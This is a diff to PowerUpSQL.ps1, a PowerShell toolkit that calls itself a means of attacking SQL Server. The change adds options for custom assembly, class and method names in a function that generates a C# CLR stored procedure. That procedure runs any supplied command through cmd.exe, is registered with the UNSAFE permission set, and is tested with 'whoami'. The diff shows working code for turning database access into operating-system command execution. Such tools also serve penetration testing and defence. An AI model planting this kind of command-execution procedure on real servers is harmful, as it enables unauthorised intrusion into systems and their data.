@@ -3,7 +3,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Major Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.82.94
+        Version: 1.82.95
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -10780,7 +10780,19 @@ function Create-SQLFileCLRDll
 
         [Parameter(Mandatory = $false,
         HelpMessage = 'Directory to output files.')]
-        [string]$OutDir = $env:temp,  
+        [string]$OutDir = $env:temp, 
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Set custom assembly name. It is random by default.')]
+        [string]$AssemblyName, 
+        
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Set custom assembly class name. It is random by default.')]
+        [string]$AssemblyClassName,    
+        
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Set custom assembly method name. It is random by default.')]
+        [string]$AssemblyMethodName,             
 
         [Parameter(Mandatory = $false,
         HelpMessage = 'Output name.')]
@@ -10820,10 +10832,20 @@ function Create-SQLFileCLRDll
         $MethodNameLength = (5..10 | Get-Random -count 1 )
         $AssemblyLength = (5..10 | Get-Random -count 1 )
 
-        # Create random class name                                        
-        $ClassName = (-join ((65..90) + (97..122) | Get-Random -Count $ClassNameLength | % {[char]$_}))
-        $MethodName = (-join ((65..90) + (97..122) | Get-Random -Count $MethodNameLength | % {[char]$_}))
-        $AssemblyName = (-join ((65..90) + (97..122) | Get-Random -Count $MethodNameLength | % {[char]$_}))
+        # Create class name
+        If(-not $AssemblyClassName){                                       
+            $AssemblyClassName = (-join ((65..90) + (97..122) | Get-Random -Count $ClassNameLength | % {[char]$_}))
+        }
+
+        # Create method name
+        if(-not $AssemblyMethodName){
+            $AssemblyMethodName = (-join ((65..90) + (97..122) | Get-Random -Count $MethodNameLength | % {[char]$_}))
+        }
+
+        # Create assembly name
+        If(-not $AssemblyName){
+            $AssemblyName = (-join ((65..90) + (97..122) | Get-Random -Count $MethodNameLength | % {[char]$_}))
+        }
 
         if (-not $SourceDllPath){
             # Create c# teamplate that will run any provided command
@@ -10837,10 +10859,10 @@ function Create-SQLFileCLRDll
             using System.IO;
             using System.Diagnostics;
             using System.Text;
-            public partial class $ClassName
+            public partial class $AssemblyClassName
             {
             [Microsoft.SqlServer.Server.SqlProcedure]
-            public static void $MethodName (SqlString execCommand)
+            public static void $AssemblyMethodName (SqlString execCommand)
             {
             Process proc = new Process();
             proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
@@ -10899,7 +10921,7 @@ function Create-SQLFileCLRDll
         if (-not $SourceDllPath){
 
             # write from default file
-            $ProcedureNameSp = "sp_$ProcedureName"
+            $ProcedureNameSp = "$ProcedureName"
             $stringBuilder = New-Object -Type System.Text.StringBuilder
             $stringBuilder.Append("CREATE ASSEMBLY [") > $null
             $stringBuilder.Append($AssemblyName) > $null
@@ -10911,7 +10933,7 @@ function Create-SQLFileCLRDll
             }
             $null = $stringBuilder.AppendLine("`nWITH PERMISSION_SET = UNSAFE")
             $null = $stringBuilder.AppendLine("GO")
-            $null = $stringBuilder.AppendLine("CREATE PROCEDURE [dbo].[$ProcedureNameSp] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [$AssemblyName].[$ClassName].[$MethodName];")
+            $null = $stringBuilder.AppendLine("CREATE PROCEDURE [dbo].[$ProcedureNameSp] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [$AssemblyName].[$AssemblyClassName].[$AssemblyMethodName];")
             $null = $stringBuilder.AppendLine("GO")
             $null = $stringBuilder.AppendLine("EXEC[dbo].[$ProcedureNameSp] 'whoami'")        
             $null = $stringBuilder.AppendLine("GO")
